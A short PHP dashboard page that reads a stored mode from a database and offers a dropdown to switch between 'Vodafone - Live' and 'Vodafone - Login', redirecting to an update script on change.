<?php
require_once("../common/commonfiles.php");
$mode = db::getCell("SELECT value from mode WHERE id=1");
$_SESSION['mode'] = $mode;
?>
<div class="row">
    <div class="col-md-12">
        <h2 id="pageName">Dashboard</h2>
        <select class="form-control" name="value" id="update_mode_value" style="width:20%;">
            <option <?php echo $mode == 1 ? 'selected="selected"' : '' ?> value="1">Vodafone - Live</option>
            <option <?php echo $mode == 2 ? 'selected="selected"' : '' ?> value="2">Vodafone - Login</option>
        </select>
        <script type="text/javascript">
            $("#update_mode_value").on("change", function () {
                window.location.href = "update_mode.php?value=" + $(this).val();
            });
        </script>
    </div>
</div>
<hr>